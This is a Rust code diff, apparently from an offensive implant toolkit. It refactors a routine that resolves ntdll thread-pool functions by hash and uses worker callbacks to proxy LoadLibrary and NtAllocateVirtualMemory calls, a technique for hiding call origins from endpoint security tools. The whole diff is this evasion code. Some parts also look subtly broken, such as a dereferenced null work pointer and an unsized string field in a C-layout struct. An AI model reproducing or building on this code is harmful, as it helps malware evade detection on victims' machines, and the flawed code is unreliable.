@@ -19,48 +19,22 @@ type TpAllocWork = unsafe extern "system" fn(*mut PTP_WORK, PTP_WORK_CALLBACK, *
 type TpPostWork = unsafe extern "system" fn(PTP_WORK);
 type TpReleaseWork = unsafe extern "system" fn(PTP_WORK);
 
-pub trait executable_via_callback {
-    unsafe fn exec_callback(self) -> bool;
-}
-
 #[link_section = ".text"]
-impl executable_via_callback for load_library {
-    unsafe fn exec_callback(self) -> bool {
-        let ntdll_address = get_module_handle(NTDLL_HASH).unwrap();
+pub unsafe fn exec_callback(callback: PTP_WORK_CALLBACK, args: *mut c_void) -> bool {
+    let ntdll_address = get_module_handle(NTDLL_HASH).unwrap();
 
-        let tp_alloc_work = (*(get_function_address(ntdll_address, TP_ALLOC_WORK_HASH).unwrap())) as TpAllocWork;
-        let tp_post_work = (*(get_function_address(ntdll_address, TP_POST_WORK_HASH).unwrap())) as TpPostWork;
-        let tp_release_work = (*(get_function_address(ntdll_address, TP_RELEASE_WORK_HASH).unwrap())) as TpReleaseWork;
+    let tp_alloc_work = (*(get_function_address(ntdll_address, TP_ALLOC_WORK_HASH).unwrap())) as TpAllocWork;
+    let tp_post_work = (*(get_function_address(ntdll_address, TP_POST_WORK_HASH).unwrap())) as TpPostWork;
+    let tp_release_work = (*(get_function_address(ntdll_address, TP_RELEASE_WORK_HASH).unwrap())) as TpReleaseWork;
 
-        let work_return: PTP_WORK = 0;
+    let work_return: PTP_WORK = 0;
 
-        tp_alloc_work(*work_return, (*loadlibrary_callback) as PTP_CALLBACK_INSTANCE, *self, 0 as *mut TP_CALLBACK_ENVIRON_V3);
+    tp_alloc_work(*work_return, callback, args, 0 as *mut TP_CALLBACK_ENVIRON_V3);
 
-        tp_post_work(work_return);
-        tp_release_work(work_return);
+    tp_post_work(work_return);
+    tp_release_work(work_return);
 
-        return true;
-    }
-}
-
-#[link_section = ".text"]
-impl executable_via_callback for nt_alloc {
-    unsafe fn exec_callback(self) -> bool {
-        let ntdll_address = get_module_handle(NTDLL_HASH).unwrap();
-
-        let tp_alloc_work = (*(get_function_address(ntdll_address, TP_ALLOC_WORK_HASH).unwrap())) as TpAllocWork;
-        let tp_post_work = (*(get_function_address(ntdll_address, TP_POST_WORK_HASH).unwrap())) as TpPostWork;
-        let tp_release_work = (*(get_function_address(ntdll_address, TP_RELEASE_WORK_HASH).unwrap())) as TpReleaseWork;
-
-        let work_return: PTP_WORK = 0;
-
-        tp_alloc_work(*work_return, (*loadlibrary_callback) as PTP_CALLBACK_INSTANCE, *self, 0 as *mut TP_CALLBACK_ENVIRON_V3);
-
-        tp_post_work(work_return);
-        tp_release_work(work_return);
-
-        return true;
-    }
+    return true;
 }
 
 #[link_section = ".text"]
@@ -91,13 +65,13 @@ pub unsafe extern "stdcall" fn nt_allocate_callback(_instance: PTP_CALLBACK_INST
 }
 
 #[repr(C)]
-pub struct load_library {
+pub struct load_library_args {
     function_pointer: usize,
     library_name: str,
 }
 
 #[repr(C)]
-pub struct nt_alloc {
+pub struct nt_alloc_args {
     function_pointer: usize,
     process: HANDLE,
     address: *mut c_void,
